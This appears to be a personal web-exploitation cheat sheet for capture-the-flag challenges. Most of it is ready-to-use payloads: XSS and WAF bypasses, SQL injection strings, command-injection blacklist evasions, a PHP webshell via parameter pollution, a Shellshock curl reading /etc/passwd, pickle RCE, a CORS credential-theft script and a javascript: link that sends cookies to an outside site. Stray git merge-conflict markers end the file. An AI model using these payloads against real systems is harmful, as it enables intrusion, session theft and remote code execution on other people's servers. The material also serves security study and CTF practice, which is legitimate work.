>WEB

#Headers

## Content-Type

**This literally can do magic**<br/>
**Try to extract every content-type that webApp accept in file Uploader, post , get requests etc.**

```
	Content-Type: application/json
	Content-Type: application/x-shockwave-flash
	Content-Type: application/js
	Content-Type: text/xml
	Content-Type: application/x-www-form-urlencoded
```

**This can help us to bypass many checks like example look at the code**

```
	x = req.body.data;
	if(x.length>1){
		console.log("fuck , u cant win");
	}else{
		if(x=="123"){
			console.log("Nice bypass, Well in JS "123"==["123"] :P ");	
		}else{
			console.log("Nice try");
		}
		
	}
```
**Now to bypass this if we send data : <br>
`Content-Type: application/x-www-form-urlencoded` and `data=123` <br>
we will loose, so knowing if other content types are acceptable , we can use it like, <br>
`Content-Type: application/json` and `{data:[123]}` <br>
 we bypass length check and also `"123" == ["123"]` .**

**Lets take challenge to next level**
```
	const regex = /[<>]/;
        
        if(regex.test(req.body.name)){
            res.send("damn, You cant have brackets boy");
        }else{
            console.log("well, here is response that i'll directly render into web-page bcz you are baby whos brackets are exposed");
            body.html(req.body.name)
        }
```
>Now , obviously the task is to call body.html with `<>` tag , but sure enough these tags are regexd .<br />
<br/>
**So a simple solution will be use `Content-Type: application/json` to send json data as <br />
`curl -X POST -H "Content-Type: application/json" --data '{"name":{"a" : "here<script>"}}'` <br/>
and this will bypass the filter as name is now a object not a string  .**


**If an file uploader allows `Content-Type: text/xml` we can upload SWF which can be used for SOP bypass , XSS , Open redirect , and leak CSRF token etc. I have a xss.swf for it .**


## Acess-Control-Allow-Origin

**This can be due to many reasons like `Misconfigured CORS` , `Bypassing checks etc` .Can be used to `full Acc. takeover` if `Access-Control-Allow-Credentials: true` ,`CSRF Token hijacking` etc. Best Values for us "**

* `Access-Control-Allow-Origin: https://www.site.com.attacker.com`
* `Access-Control-Allow-Origin: *`
* `Access-Control-Allow-Origin: null`

```
curl https://test.victim.com/api/requestApiKey -H "Origin: https://evil.com" -v
```
>And check the response if Origin is reflected in the response in ACAO.

**Exploiting..**
```
	var req = new XMLHttpRequest();
	req.onload = reqListener;
	req.open('get','https://test.victim.com/api/requestApiKey',true);
	req.withCredentials = true;
	req.send();
```

some resources : <br>
https://www.geekboy.ninja/blog/tag/cors-exploitation/
https://portswigger.net/kb/papers/exploitingcorsmisconfigurations.pdf


## X-Forwarded-For

**If you are unauthorized to access some page based on IP address**
> so this is basically if u cant acccess a page bcz u dont belong to internal network
this header is basically what usually progamming language use to determine the IP of 
incomming request, so this might help you spoof IP

```
GET / HTTP/1.1
Origin: 192.121.22.45
X-Forwarded-For: 192.121.22.2
```
> use CTS(critical thinking skills) now to find its value, usually something from the network, or localhost or some trusted 3rd party site is using etc


## HSTS

**HTTP strict transport security** 
Used to tell browser to make request only using https.

`Strict-Transport-Security: max-age=153231670; includeSubdomains; preload`

poosible attack : TOFU , first request ever made to site is insecure nd prone to mitm

## HPKP

**HTTP Public Key Pinning (HPKP)**


## X-Frame-Options

Prevents click jacking but obfusgated. click jacking can also be prevented using csp header

## Cache-Control

Browser caches this request 

`Cache-Control: private, max-age=1670;` 

## X-XSS-Protection

THis was used to block browsers xss filter lol.

#Xss Tricks

## Using `__proto__` to included blacklist values in object

**Object proto property .**
```
t = {}
userInput = [ INPUTHERE ]
if(userInput.thisCannotExist){
	console.log("Sorry u cannot have this value in input");
}else{
	t = {...t,...userInput};
}
if(t.thisCannotExist){
	console.log("How did u get this here?");
}

```
**So input cannot have `thisCannotExist` key .**

> Bypass is simple. `userInput = {'__proto__' : { 'thisCannotExist' : 'yo' } }`.


## Bypassing hard filters


** Injecting is inside Javascript, so out data is reflected in JS .**

`/ but the content to next line `

> `(alert)(23)//` 
> `"/(alert)(23)//`

** Injection when we can inject into html but cant get xs bcz of string waf

WAF blocking **Spaces**,**onload=alert()**

> `<dEtAiLS%09OnpoinTEreNtER%0D=%0Da=prompt,a()%20x>`
> `<dETAILS%0aopen%0aonToGgle%0a=%0aa=prompt,a() x>`

> `<img/src='1'/onerror/=console.log`1`/>`


#CSP Bypass

##Missing `base-uri` in CSP 

>Note! Its possible when there is HTML Injection in head and site uses relative URL and injection need to be in head for `<base>` tag

If the scripts are loaded as `<script src='/app.js' nounce=1231231231>` and csp only allows to load script with nounce , using html injection we can add
`<base src='https://evil.com'>`<br>
and then scripts will be loaded from our url now

##Exploiting `Missing script-src self`
>Since script-src is not limited to self, we can load javascript from our own website. Additionally, we can even dynamically load javascript from specify URL.

```
exploit = <script src=http://example.com/evil.js>
```
will just fetch content of evil.js from our server as self is not mentioned in CSP.


##https://csp-evaluator.withgoogle.com/

**Use that site to copy paste whole CSP and find vulneribilities**

example copy,
```

default-src 'none';
script-src 'nonce-23434534' 'strict-dynamic';
style-src 'self' https://stackpath.bootstrapcdn.com/bootstrap/4.1.3/css/bootstrap.min.css;
img-src 'self';
connect-src 'self';
frame-src https://www.google.com/recaptcha/;
form-action 'self';

```
all these into it, and u will find 2 exploits, base-uri missing i.e `<base>` tag attack, and self in script missing so `script-src attack`


# SSRF and IP Bypass

## IP Bypasses

**So lets see ways to bypass checks to include IP address .**

```
userInput = [ INPUTHERE ]
if (userInput && userInput.value.indexOf('.') == -1 && userInput.value.indexOf("//") == -1 && userInput.value.indexOf("。") == -1 && userInput.value && typeof(userInput != 'object')) {
        if (userInput.type == "img") {
            <img src=[INPUTHERE] />
        } else {
            alert("-_-");
        }
    }
```
>The bypass is :` { value : "\\\\1869573999" } `

* **So there are 2 checks input cannot have `.(dot)` and `//` preventing us to write http://any[dot]com .**

* **`//` can be bypassed using one of chrome features - putting double backslash `\\\\`(we need 2 backslash so 4 bcz 1 escape other) as a URL prefix will be replaced with current schema - so http://. What's worth to mention, it works like this only on linux. In windows version of chrome \\ is replaced with file:// .**

* **Cannot have `.`(dot) -_-. `1869573999` is decimal representation of IP address . Ip address can be represented as hex,decimal,oct binary. so in decimal looks like `http://3512041827/` octal looks like `http://0100.0351.0251.0152/` , `http://00C0.00A8.002B.005C` etc .**



## Basic testing

* https://beeceptor.com/console/aaaaaaa
* file:///etc/passwd
* file:///proc/self/cmdline

# SSTI


## RUBY

* <%= 7 * 7 %>
* <%= File.open('/etc/passwd').read %>


**check payloads in payloadandallthing**

## Angular
	
* `{{5*5}}`
* `{{a=toString().constructor.prototype;a.charAt=a.trim;$eval('a,alert(1),a')}}` for Versions 1.3.0-1.5.7
* `{{a="a"["constructor"].prototype;a.charAt=a.trim;$eval('a",alert(alert=1),"')}}` for Versions 1.2.20-1.2.29
* `{{c=toString.constructor;p=c.prototype;p.toString=p.call;["a","alert(1)"].sort(c)}}` for 1.2.19
* `{{(_=''.sub).call.call({}[$='constructor'].getOwnPropertyDescriptor(_.__proto__,$).value,0,'alert(1)')()}}` for 1.2.6 - 1.2.18
* `{{a="a"["constructor"].prototype;a.charAt=a.trim;$eval('a",alert(alert=1),"')}}` for 1.2.0 - 1.2.5

# Fuzzing

## How to fuzz

**Fuzzing is the rank 2 thing we should start after RECON. But this will need us to think differently, exploiting web app is not hard, finding bug is hard.**

**Imagine this scenario : you want to buy a shirt for your friend, now what things will you keep in mind ? <br/> Size? color? this is linear thinking <br /> think shirt as a object, what things will it contain? <br /> collar,size,color,fullarm/halfarm ? etc .** <br />

**This approch to think in multi direction is needed, lets apply it to our scenario now. .**


# Race Condition

**Finding Race Condition is basically just see if some API is taking too long to response, could be due to computation, saving to cache, retrieving db etc .**
[writeup in web/race Condition]


# SQL Injection


## sql-ite injection with not allowed > spaces ' " union select

* `%0a` to make spaces
* `unUnionion` string cutting because it was replacing our input

> get table names
```
?id=1%0aununionion%0aselselectect%0a1,2,group_concat(tbl_name)%0afrom%0asqlite_master--
```
> get column names
```
?id=1%0aununionion%0aselselectect%0a1,2,group_concat(sql)%0afrom%0asqlite_master--
```

## procedure analyses to get column name

```
SELECT id, name, pass FROM users WHERE id = x  LIMIT 1,1  PROCEDURE ANALYSE() --
```
## 1%0 trick and MySQL subqueries

**USE IT WHEN**
* **Tbl name is known+ columns is not null**

>Ok, imagine you have the table USER_TABLE. You don’t have any other informations than the table’s name.
The sql query is expecting only one row as result.

Here is our input:
` AND (SELECT * FROM USER_TABLE) = (1)––`

MySQL answer:
**Operand should contain 7 column(s)**

MySQL told us that the table USER_TABLE has 7 columns! That’s great!

Now we can use the UNION and 1%0 to retrieve some column’s name:

The following query shouldn’t give you any error:
` AND (1,2,3,4,5,6,7) = (SELECT * FROM USER_TABLE UNION SELECT 1,2,3,4,5,6,7 LIMIT 1)–– `

Now let’s try with the first colum, simply add %0 to the first column in the UNION:
` AND (1,2,3,4,5,6,7) = (SELECT * FROM USER_TABLE UNION SELECT 1%0,2,3,4,5,6,7 LIMIT 1)–– `

MySQL answer:
**“Column ‘usr_u_id’ cannot be null”**

We’ve got the first column name: “usr_u_id”

Example with the 4th column:
` AND (1,2,3,4,5,6,7) = (SELECT * FROM USER_TABLE UNION SELECT 1,2,3,4%0,5,6,7 LIMIT 1)–– `

## Extracting Column names

![alt](./images/sql1.png)

0′ UNION SELECT version(),null /*
or:
0′ UNION SELECT @@version,null /*


## PAYLOADS

* `'/**/union/**/select/**/flag/**/from/**/flag` 
* `?id=1+%00’union+select+1,2,3′–`  i.e null byte
* `?id=-1 /*!u%6eion*/ /*!se%6cect*/ 1,2,3,4—` url encode
* `?id=-1/%2A%2A/union/%2A%2A/select/%2A%2A/1,2,3,4,5 –+-` url encode
* `?id=-1+uni*on+sel*ect+1,2,3,4–+-` idk how will this work
* `?id=-1/* &id= */union/* &id= */select/* &id= */1,2 —` parameter pollution
* `=1+and(/*!50000select*/ 1)=(/*!32302select*/0xAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA)+/*!uNIOn*/+/*!SeLECt*/+1,2,3 –+-` buffer overflow


## advance MySQL table and column names

[LINK TO WRITEUP](./docx/sql1.pdf)



# Comman Vulnerabilities

## LFI/LFD

> PHP LFI to RCE(PHP any-7.2)

[LINK TO WRITEUP](./docx/phpsession.pdf)

> this works even with session.upload_progress disabled

__whats session.upload_progress?__

Whenever we upload a file via multipart request example:
```
`curl -X POST -H 'Cookie: PHPSESSID=iamorange' -F 'file=asdf' `
$ ls -a /var/lib/php/sessions/
. .. sess_iamorange
```
so we control a file and its content and this is what session.upload_progress does. It creates a file with name of phpsessionid in /varr/lib/php/sessions/ , if its disabled it doesnt create this file.


## python general files to bruteforce 

> get /proc/self/cmdline can leak the location where the python app is loaded 

```
>  url=file:///proc/self/cmdline

<  uwsgi --socket 0.0.0.0:8000 --module rwctf.wsgi --chdir /usr/src/rwctf --uid nobody --gid nogroup --cheaper-algo spare --cheaper 2
```

so working directories are : /usr/src/rwctf

actual places where to look for below mentioned files are `/usr/src/rwctf/rwctf/settings.py` , `/usr/src/rwctf/admin/settings.py` etc

* `__init__.py`
* `urls.py`
* `settings.py`
* `apps.py`
* `views.py`



## php general files to bruteforce get


## IDOR
## CORS

**ACAO header checking .**

## DATA Leak
## CSRF

**Flashbased CSRF with SOP bypass(crossdomain.xml bug)**

> Caused due to misconfigured crossdomain.xml
if in `crossdomain.xml` allowsites is * , we can perform this attack

how crossdomain.xml?
When we want data from xxx.com to evil.com with flash, Flash first check that Xxx.com has crossdomain.xml or not. If there It checks its details Like does it accept evil.com request or not

Attack
```
We create 3 things in our server
php page 
flash file
Crossdomain.xml in root dir
``` 
* we create a crossdomain.xml in our evil.com with wildcards `allowsites:*`
* Now lets make flash file
![alt](./images/flash.jpeg)
! here test.php is our php which we will create on our server with contents as
```
<?php
 
// redirect automatically
 
header("Location: https://victim.com/user/endpoint/", true, 307);
 
?>

```
307 redirect to redirect without changing anything in body

* embed this flash in html

> User opens html, get redirected to out test.php with content mentioned in flash file, our test.php will redirect that request to `victim/user/endpoint` with SOP bypass


## XML injection
## XXE

## Parameter polluting

>Tips
* Always use `%26` instead of `&`

x.php

```
$data = $_POST['data'];
$name = uniqid();

$payload = "data=$data&name=$name";
$post = http_build_query([
    'signature' => hash_hmac('md5', $payload, FLAG),
    'payload' => $payload,
]);

$ch = curl_init();

curl_setopt($ch, CURLOPT_URL, "http://127.0.0.1" . $_SERVER['REQUEST_URI'] . "?action=log");
curl_exec($ch);
```
p.php
```
if (hash_hmac('md5', $_POST['payload'], FLAG) !== $_POST['signature']) {
	echo 'FAIL';
	exit;
}

parse_str($_POST['payload'], $payload);

$target = 'files/' . time() . '.' . substr($payload['name'], -20);
  $contents = $payload['data'];
  $decoded = base64_decode($contents);
  $ext = 'raw';

  if (isset($payload['ext'])) {
    $ext = (
      ( $payload['ext'] == 'j' ) ? 'jpg' :
      ( $payload['ext'] == 'p' ) ? 'php' :
      ( $payload['ext'] == 'r' ) ? 'raw' : 'file'
    );
  }

  if ($decoded !== '') {
    $contents = $decoded;
    $target .= '.' . $ext;
  }

  if (strlen($contents) > 37) {
    echo 'FAIL';
    exit;
  }

  file_put_contents($target, $contents);

```

The vulnerability is on $payload = "data=$data&name=$name";
we can use $data to control $name by `$data: xxx&name=new_name%00`
The NULL byte will truncate the original name.

Now we nee to write a webshell and execute it.
But if $decoded !== '', it will append extension to the filename.

And we know that php's base64_decode() will output empty string if its input doesn't contain any valid character. (valid character include a-z, A-Z, 0-9, +, /, ...)

There are some tips, we can use some arithmetic operation like XOR, NOT, AND, ... to construct the php code.

So if we set data to <?=`something`;&name=z.php%00, the $decoded will be empty and the name can be controled.

The content of the file will not be decoded, it is the original content: <?=`something`;

so payload willbe :
```
data=<?=$_=~%9c%9e%8b;`$_ ../*>_`;%26name%3Dz.php%00
```

`~%9c%9e%8b is cat`

so the payload will cat everthing in ../, then write to _ .


## File Uploading Injection

* Try `shell.php` , `shell.pHp5` , `shell.php4`,`shell.php4;`,`shell.php4%00` ,`shell.phtml`,`shell.pht` , `shell.pgif` , `shell.phpt`,`shell.shtml`
* filename `<svg/onload=prompt(1)>.png`
* see if flash file can be uploaded
* change Content-Type , upload `shell.png` with php content and intercept request and change content-type from `png` to `php5`
* ~~ImageTragic~~ `have to read this`
* shell in gif/png files

## LDAP

**These are like sqli just use `*` or `|` or `&` to find it .**
```
http://web.chal.csaw.io:8080
http://web.chal.csaw.io:8080/index.php?search=pete*
so search is like `select * from whtever where (&(name=INPUT)(uid=123))`
so 
http://web.chal.csaw.io:8080/index.php?search=pete*)(uid=123 
will confirm injection of uid
http://web.chal.csaw.io:8080/index.php?search=pete*)(uid=123)(|(uid=*
will inject uid
```

## Command Injection

```
blackList = [";","&","|"," ","cat"];
userInput = req.get("cmd");
if blacklist.includes(userInput):
	exit("ERROR")
else:
	system("ping -c 4 ".userInput)[:86]; // so even if someone append something, ping's result is whats 									 // output only
```
> exploit : `index.php/?cmd=error%0ac'a't$IFS/etc/flag`
> So there is a simple blacklist. so lets see how to solve it 

* Use burp intruder we can find these blacklist 
* Now we need to append our command but `&`,`;` and `|` are blocked, so lets see whats are its bypasses
	* `%0a`, `%0A` 
	* `^`
	* `%0d`, `%0D`
* Next we need can simply make 'error' in 1st query by `ping error`%0a[nextCommand]
* Now next command cannot have space, so we have many things to avaoid having space
	* `%0a{cat,/etc/flag}` , the {ls,-l,a,Gh} is a shell feature equivalent to `ls -l a Gh`
	* `%0acat$IFS/etc/flag` , the `$IFS` is shell variable equivalent to space
	* `%0acat${IFS:0:1}/etc/flag`, setting this IFS variable length
	* `%0ad=$'cat\x20/etc/flag'%0a$d` , so `$'\x20'` is translated to space
* Now `cat` is blocked , we can easily use `tail`, `head` etc but cmon we are hackers
	* `c'a't` in shell is equal to cat
	* `c$@at` is again cat
	* `c\a\t`
	* `c"a"t`
	* ***




## OAUTH2

>`/oauth2/authorize` gives you auth token to authorize urself 

```

> curl -X POST --data "response_type=code&redirect_uri=web.chal.csaw.io:9000/oauth2/token" --header "Content-Type: application/x-www-form-urlencoded" web.chal.csaw.io:9000/oauth2/authorize

< Redirecting to <a href="web.chal.csaw.io:9000/oauth2/token?code=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJyZWRpcmVjdF91cmkiOiJ3ZWIuY2hhbC5jc2F3LmlvOjkwMDAvb2F1dGgyL3Rva2VuIiwiaWF0IjoxNTM5MTI0MTE4LCJleHAiOjE1MzkxMjQ3MTh9.RZJx1tftkU9pEm7-2m1mM-sTaxgJJEwzlP7-rkjhjPU&amp;state=">web.chal.csaw.io:9000/oauth2/token?code=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJyZWRpcmVjdF91cmkiOiJ3ZWIuY2hhbC5jc2F3LmlvOjkwMDAvb2F1dGgyL3Rva2VuIiwiaWF0IjoxNTM5MTI0MTE4LCJleHAiOjE1MzkxMjQ3MTh9.RZJx1tftkU9pEm7-2m1mM-sTaxgJJEwzlP7-rkjhjPU&amp;state=</a>.


```

>`/oauth2/token` to get the admin token (here code param value is what we get from above request rest all values are usually same)
```
> curl -X POST --data  "grant_type=authorization_code&code=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJyZWRpcmVjdF91cmkiOiJ3ZWIuY2hhbC5jc2F3LmlvOjkwMDAvb2F1dGgyL3Rva2VuIiwiaWF0IjoxNTM5MTIzNDk2LCJleHAiOjE1MzkxMjQwOTZ9.up2K5DnLBIeO_vPJREaOfG0XvsppUthhcqXcFWacprM&redirect_uri=web.chal.csaw.io:9000/oauth2/token" web.chal.csaw.io:9000/oauth2/token
```
>next just use Authorization: Bearer `response token from /token` and you are admin

* **Redirect URI should be same in both case of /authorize and /token if we can pass different uri, its a bug** <br/>
* **If we are able to use the token twice still a bug**<br/>
* **This redirect uri if point to our url and still gives token is also a vulnerablility**<br/>


## Shellshock

> So if there is cgi-bin/* like cgi-bin/stats  , cgi-bin/netsparker.cgi 

```
curl -H “user-agent: () { :; }; echo; echo; /bin/bash -c 'cat /etc/passwd'" http://site.com/cgi-bin/stats
```


# Deserialization


## Python


>Suppose the task is simply read `flag.txt`

```
x = cPickle.dumps(raw_input())
try:
	out = cPickle.loads(base64.b64decode(x))
except:
	pass

response.send(out)
```

**So it takes out input and does dumps on it so we dont have to do it**

>solution

```
class PickleRce(object):
    def __reduce__(self):
        import subprocess
        return (subprocess.getoutput,('cat flag.txt',))

out = PickleRce()

```


# Bypasses

## PHP REGEX bypass

`cannot have " or '`

```
> echo pack(C3,112,104,112);
< php
```

`$_GET['q'] is preg_match and we cannot have "flag.php" in it`

> Bypass 1

```
> site.com/?q=get_defined_vars()[_GET][X]&X=flag.php

> get_defined_vars()[_GET][X] & X=flag.php 
```
### Bypass 2 ** AWESOME TRICK **

In php , if we send `site.com/?q=substr(asdf,0,10)`, so unlike most language showing asdf is not defined php will auto convert asdf to "asdf" string and pass into substr

```
> site.com/?q=str_rot13(substr(cjq))
```
so no need of `;'",$_` .



##PHP cannot have `_` 

**PHP functionality  converts `.` and spaces into `_`, so `site.com/?c.m.d=23` gets converted to "$c_m_d=23" .**

##spaces are not allowed

**Use `+` in query string to bypass space .**


## Python "a""b" is "a"+"b"

**Well  if in python + is blocked , we can just use this trick to append**

## Python3 f''

https://github.com/p4-team/ctf/tree/master/2018-07-13-meepwn-ctf/web_pycalcx#pycalcx2-54-solved-100p

```
FLAG = "hello"
source = raw_input()

f'Tru{FLAG<source or 14:x}'  

```
* We use the short circuit `or` to get one of the two results, depending on the result of comparison `FLAG < source`, i.e , `True or 14` returns True and False or 14 returns 14.
* We use x modifier to turn 14 into hex digit e
* `Tru{FLAG<source or 14:x}` therefore evaluates to either `Tru1` or `True`, depending on the FLAG>source condition


## REGEX bypassing

**Approch**

* use burp intruder to find all the blocked characters ,ex / `site.com/?id=%$$` in intruder and intefer from `1` to `ff`, will make 255 requsest from %00 to %FF finding blocked characters
* now imagine we get blocked `%20` = `space`, `%3b` = `;` , `%26` = `&`, so now make a list of allowed yet dangerous chars,
* so we can send `%00`, `%0a` , `{`,`}`,``` ` ```, `$`,`<`,`>`,`/`,`\`,`,`,`"`,`'` etc
* Now just find the appropriate bypass


```
$cmd = $_GET['c_m_d'];
if(!preg_match('/[a-z0-9]/is', $cmd)){
	system("/sandboxed_bin/".$cmd);
}
```
* Find supported UTF encoding, cuz `a` === `à`, finding unicode can help here.
* `GET  : /?c_m_d[]='ls'` will make cmd as array and bypass check in PHP
* `POST : { c_m_d : ['ls']` with `Content-Type: application/json` in any.
* `GET  : /?c_m_d=???+????.???` will be cat flag.txt and bypass regex

**some command bypasses**

* Try mixing upper+lower case `HtTp` 
* `regex : a.*b` can be bypassed `a%0Ab`

```
$black_list = "/admin|guest|limit|by|substr|mid|like|or|char|union|select|greatest|%00|\'|";
$black_list .= "=|_| |in|<|>|-|chal|_|\.|\(\)|#|and|if|database|where|concat|insert|having|sleep/i";
if(preg_match($black_list, $_GET['user'])) exit();
if(preg_match($black_list, $_GET['pw'])) exit(); 

$query="select user from chal where user='$_GET[user]' and pw='$_GET[pw]'"; 

```
* using `\` to bypass next letter. so  `'` is block ,use `\`,i.e `/?user=\&pw=||user/**/REGEXP/**/%22admi%22||%22n%22;%00` ,making this request <br/>
we get `where user='\' and pw='||user REGEXP "admi||n" '` where regexp is mysql feature


## PHP file_get_content 

**This is super dangerous**

```
$f = $_GET['content'];
file_get_contents($f);
```

Possible values of `$f` are:
* file_get_contents('https://www.evil.com/mydata'); so `$f = https://www.evil.com/mydata`
* `php://input` and "mydata" in POST `so $f=php://input`
* All php wrapper , `php://filter`, `php://fd/0` etc
* `$f = data://text/plain,Hello Challenge! `
* `$f = data://text/plain;base64,SGVsbG8gQ2hhbGxlbmdlIQ`


## PHP Assert

**They have code execution**
so if we have 
```
$x=$_GET['key'];
assert($x > 50);
```
so if we put `site.com/?key=printf('flag'); //`

this will execute the command.

# URL's

## `..\Q/\E` in Ruby equals `../`

## Nginx off by slash

**Python's Djano, ruby etc donot have inbuilt static files folder, so ppl put nginx infront of these apps for <br/>
delivering static file .**

**In `nginx` we can define a alias for a location .eg**
```
location /static {
	alias /home/pi/;
}
```
exploit : `127.0.0.1/static../`, so `/static` in route matches `location /static` <br/>
causing to make path=`/home/pi/../` giving us access to 1 directory above

>so how to find this
* http://target.com/asset/app.js  [200 OK]
* http://target.com/asset/		  [403] 
* http://target.com/asset/../setting.py [404]
* http://target.com/asset../ 			[403]
* http://target.com/asset../assets/app.js [200] :O wow but yeah, we might get `alias.com/alias/../assets/app.js`
* http://target.com/asset../setting.py    [200] is file is in above directory else 404?

## javacript:alert

if we can insert links
```
javascript:document.location="http://mysite.com/"+document.cookie
```

## python flask url checks bypass

```
from  werkzeug.urls import url_parse

@app.route('/xyz'):
	
	postdata = app.request.post("url")
	scheme, netloc, path, query, fragment = url_parse(postdata)
	if path.startsWith("/cannotViewThisPage"):
		return None
	else:
		request.get(postdata,allow_redirects=False) # if this is true , just redirect and get

@app.route('/cannotViewThisPage'):
	if request.remote_addr != "127.0.0.1":
			// if request not comming locally, fuck him
			return "Fuck off"
	else:
		print "you win"
```

> ok so task is simple, we need "you win"
payload
```
POST site.com/xyz

url=http://localhost///cannotViewThisPage
```

so `url_parse` will return path of `http://localhost///cannotViewThisPage` as "///cannotViewThisPage"
which indeed dont start with "/cannotViewThisPage" and when request module makes reques, python django will hit /cannotViewThisPage







<<<<<<< HEAD
=======

>>>>>>> refs/remotes/origin/master
